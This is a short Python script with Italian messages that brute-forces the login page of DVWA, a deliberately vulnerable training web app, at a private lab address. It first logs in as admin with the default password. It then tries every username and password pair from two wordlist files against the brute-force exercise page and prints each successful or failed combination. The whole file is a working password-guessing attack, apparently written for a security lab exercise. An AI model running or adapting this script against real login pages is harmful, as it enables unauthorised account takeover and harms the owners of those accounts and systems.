import requests
from colorama import Fore

session= requests.Session()

def login():
    with session.post(main_login, payload("admin", "password")) as l:
        if welcome_text in l.text:
            print("FIRST LOGIN AS ADMIN SUCCESSFULLY DONE ... \n")
        
def construct_url(u,p):
    return url + f"?username={u}&password={p}&Login=Login"
    
def payload(u,p):
    return {"username":u,"password":p, "Login":"Login"}

def http_call(u,p):
    try:

        url = construct_url(u, p)
        with session.get(url) as response :
                
            if welcome_text in response.text:
                print(Fore.GREEN + f"siamo riusciti ad entrare la username è: \033[1;35;40m{u} la password è: \033[1;35;40m{p}")
                return True
            else:
               print(Fore.RED + f" {url} tentativo con username: \033[1;33;40m{u} e password: \033[1;33;40m{p} fallito")
               return False
                      
    except Exception as e:
        print(f"riscontrato errore: {e} \n")
        
            
def open_file(file_name):
    with open(file_name) as file:
        return [line.strip() for line in file.readlines()]
    
url="http://192.168.50.101/dvwa/vulnerabilities/brute/"

main_login="http://192.168.50.101/dvwa/login.php"
usernames = open_file("usernames.txt")
passwords = open_file("password.txt")
welcome_text="Welcome to the password protected area"

login()

for username in usernames:
    for password in passwords:
        r=http_call(username, password)
    #     if (r==True): 
    #         break
    # if (r==True):
    #     break